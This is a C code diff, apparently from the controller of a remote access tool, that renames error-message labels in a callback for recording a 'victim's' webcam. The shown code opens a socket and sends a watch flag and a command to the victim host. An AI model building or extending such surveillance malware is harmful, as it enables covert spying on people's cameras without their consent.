@@ -367,7 +367,7 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     number_of_frames = malloc(16 * sizeof(char));
     if(number_of_frames == NULL)
     {
-        error("malloc() number_of_frames", "cb_stream_the_webcam()");
+        error("malloc() number_of_frames", "cb_record_webcam()");
         exit(-1);
     }
 
@@ -407,7 +407,7 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     final_victime_cmd = malloc(200 * sizeof(char));
     if(final_victime_cmd == NULL)
     {
-        error("malloc() final_victim_cmd", "cb_stream_the_webcam()");
+        error("malloc() final_victim_cmd", "cb_record_webcam()");
         exit(-1);
     }
 
@@ -434,7 +434,7 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock == INVALID_SOCKET)
     {
-        error("socket()", "cb_stream_the_webcam()");
+        error("socket()", "cb_record_webcam()");
         exit(-1);
     }
 
@@ -442,25 +442,25 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
 
     if(err == SOCKET_ERROR)
     {
-        error("connect()", "cb_stream_the_webcam()");
+        error("connect()", "cb_record_webcam()");
         exit(-1);
     }
 
     if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
     {
-        error("send() flag_watch", "cb_stream_the_webcam()");
+        error("send() flag_watch", "cb_record_webcam()");
         exit(-1);
     }
 
     if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
     {
-        error("send() len_final_cmd", "cb_stream_the_webcam()");
+        error("send() len_final_cmd", "cb_record_webcam()");
         exit(-1);
     }
 
     if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
     {
-        error("send() final_victime_cmd", "cb_stream_the_webcam()");
+        error("send() final_victime_cmd", "cb_record_webcam()");
         exit(-1);
     }
 
